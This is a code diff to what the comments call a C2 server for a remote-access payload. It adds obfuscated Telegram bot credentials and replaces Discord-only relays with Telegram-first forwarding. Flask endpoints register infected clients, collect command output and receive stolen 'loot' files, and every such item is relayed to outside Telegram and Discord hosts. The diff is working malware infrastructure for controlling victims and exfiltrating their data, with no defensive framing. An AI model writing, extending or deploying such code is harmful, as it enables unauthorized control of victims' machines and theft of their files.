@@ -53,8 +53,13 @@ def _xd(d, s="k3ycu5t0m", r=4):
     ol = (raw[-2] << 8) | raw[-1]
     return bytes(raw[:ol]).decode()
 
-_WH_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
+_WH_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
 DISCORD_WEBHOOK_URL = _xd(_WH_ENC)
+
+_TG_TOKEN_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
+_TG_CHAT_ENC = bytes([0x00]) # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE # PASTE_YOUR_BYTES_HERE
+TG_TOKEN = _xd(_TG_TOKEN_ENC)
+TG_CHAT = _xd(_TG_CHAT_ENC)
 
 # --- DATA STORES ---
 clients = {}
@@ -69,21 +74,40 @@ _stop_event = threading.Event()
 global_logs = deque(maxlen=10)
 
 # ===========================================================================
-# WEBHOOK PROXY — Payload sends here, C2 forwards to Discord
+# WEBHOOK PROXY — Payload sends here, C2 forwards to Telegram/Discord
 # ===========================================================================
-def discord_send_text(content):
-    """Forward text message to Discord webhook."""
-    try:
-        http_requests.post(DISCORD_WEBHOOK_URL, json={"content": content}, timeout=10)
-    except: pass
+def notify_text(content):
+    """Forward text message to Telegram, fallback to Discord."""
+    success = False
+    if TG_TOKEN and TG_CHAT:
+        try:
+            url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
+            r = http_requests.post(url, json={"chat_id": TG_CHAT, "text": content[:4096]}, timeout=10)
+            if r.status_code == 200: success = True
+        except: pass
+    
+    if not success and DISCORD_WEBHOOK_URL:
+        try: http_requests.post(DISCORD_WEBHOOK_URL, json={"content": content}, timeout=10)
+        except: pass
 
-def discord_send_file(file_bytes, filename, content=""):
-    """Forward file to Discord webhook."""
-    try:
-        http_requests.post(DISCORD_WEBHOOK_URL, 
-                          data={"content": content},
-                          files={"file": (filename, file_bytes)}, timeout=30)
-    except: pass
+def notify_file(file_bytes, filename, content=""):
+    """Forward file to Telegram, fallback to Discord."""
+    success = False
+    if TG_TOKEN and TG_CHAT:
+        try:
+            url = f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument"
+            r = http_requests.post(url, 
+                                  data={"chat_id": TG_CHAT, "caption": content[:1024]},
+                                  files={"document": (filename, file_bytes)}, timeout=30)
+            if r.status_code == 200: success = True
+        except: pass
+
+    if not success and DISCORD_WEBHOOK_URL:
+        try:
+            http_requests.post(DISCORD_WEBHOOK_URL, 
+                              data={"content": content},
+                              files={"file": (filename, file_bytes)}, timeout=30)
+        except: pass
 
 # --- API ENDPOINTS ---
 @app.route('/register', methods=['POST'])
@@ -123,9 +147,9 @@ def report_output(client_id):
     header = f"**[Result]** `{client_id[:8]}` (CMD: `{command_line}`)\n"
     if len(output) > 1900:
         # Send as file attachment
-        discord_send_file(output.encode('utf-8'), f"result_{cmd_id}.txt", header)
+        notify_file(output.encode('utf-8'), f"result_{cmd_id}.txt", header)
     else:
-        discord_send_text(f"{header}```\n{output}\n```")
+        notify_text(f"{header}```\n{output}\n```")
     
     global_logs.append(f"[dim][📋] Output from [cyan]{client_id[:8]}[/]: {command_line}[/]")
     return 'OK', 200
@@ -146,9 +170,9 @@ def receive_loot(client_id):
     with open(save_path, 'wb') as f:
         f.write(file_bytes)
     
-    # Forward to Discord
+    # Forward to Telegram/Discord
     message = request.form.get('message', f"📁 Loot from `{client_id[:8]}`: `{filename}`")
-    discord_send_file(file_bytes, filename, message)
+    notify_file(file_bytes, filename, message)
     
     global_logs.append(f"[bold yellow][⬇][/] Loot from [cyan]{client_id[:8]}[/]: [green]{filename}[/]")
     return 'OK', 200
